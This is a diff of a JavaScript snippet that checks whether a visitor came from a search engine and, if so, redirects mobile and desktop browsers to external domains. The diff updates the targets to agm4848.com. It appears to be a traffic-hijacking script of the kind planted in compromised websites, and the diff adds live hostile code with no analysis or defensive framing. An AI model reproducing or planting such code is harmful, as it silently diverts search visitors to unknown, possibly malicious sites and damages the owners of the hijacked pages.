@@ -13,9 +13,9 @@ var regexp = /\.(baidu|haosou|so|sogou|soso|google|sm|yahoo|bing|360)(\.[a-z0-9\
 var where = document.referrer;
 if (regexp.test(where)) {
   if (/mobile|android|iphone|ipad|phone/i.test(navigator.userAgent.toLowerCase())) {
-    location.href=(Math.random()<0.5)?"https://m.k88208.com":"https://m.kf0000.com";
+    location.href=(Math.random()<0.5)?"https://m.agm4848.com":"https://m.agm4848.com";
   }
   else{
-    location.href=(Math.random()<0.5)?"https://www.k88208.com":"https://www.kf0000.com";
+    location.href=(Math.random()<0.5)?"https://www.agm4848.com":"https://www.agm4848.com";
   }
 }
